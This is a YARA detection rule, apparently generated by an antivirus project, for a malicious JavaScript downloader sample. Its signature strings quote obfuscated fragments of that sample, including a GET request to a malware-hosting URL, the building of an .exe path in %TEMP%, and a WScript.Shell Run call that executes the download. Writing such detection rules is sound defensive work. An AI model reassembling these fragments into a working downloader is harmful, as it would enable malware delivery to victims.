rule sig_20160328_c5a33e478036933ba0cefb0b8a08e8e5 {
  meta:
    description = "datamaliciousorder - file 20160328_c5a33e478036933ba0cefb0b8a08e8e5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d8a5763051658825e179957f15619185782a6c02f2ac5dd0e31323d9194be9b3"

  strings:
    $s1  = "function Ikvjkro() {return Oxvcdvtal[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"AvHuCg02Tg4Yiuqq.exe\";};" fullword ascii
    $s2  = "Pfqoca[Yemrobdfr](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "var Oxvcdvtal = function Yvfsc() {return WScript[Btgetumwy](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Pvasmuyl(Rykuzkqq, Ujyqpuysam){return Rykuzkqq - Ujyqpuysam;};" fullword ascii
    $s5  = "do {WScript[Jyvmfexs](Jerzu() * 11)} while (Pfqoca[\"readystate\"] < 4 );" fullword ascii
    $s6  = "function Nrohjgt(){return Btgetumwy;};" fullword ascii
    $s7  = "function Poxwrfnhnz() {return ((Jbyarqjyy == true) && (Jbyarqjyy == Uzyjczng)) ? 1 : Rwyyd;};" fullword ascii
    $s8  = "function Uhxrkliik(Ppbrztahx){Oxvcdvtal[\"Run\"](Ppbrztahx, Rwyyd, Rwyyd);};" fullword ascii
    $s9  = "Uzyjczng = true; " fullword ascii
    $s10 = "Jbyarqjyy = true; " fullword ascii
    $s11 = "var Uzyjczng = false;" fullword ascii
    $s12 = "var Myelj = false;" fullword ascii
    $s13 = "var Jbyarqjyy = false;" fullword ascii
    $s14 = "function Menawzfa(Qdgwsiz) {var Hnhgpt = (1, 2, 3, 4, 5, Qdgwsiz); return Hnhgpt;};" fullword ascii
    $s15 = "function Jerzu(){return 22;};" fullword ascii
    $s16 = "return Pvasmuyl(Sgqsmz, Xipslgk);" fullword ascii
    $s17 = " while (Ycstpzi){" fullword ascii
    $s18 = "var Jnbxeoji = new this[\"Date\"]();" fullword ascii
    $s19 = "function Qnrxg(){return Khfpwhxwrz;};" fullword ascii
    $s20 = "function Dkvlqzfzq()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}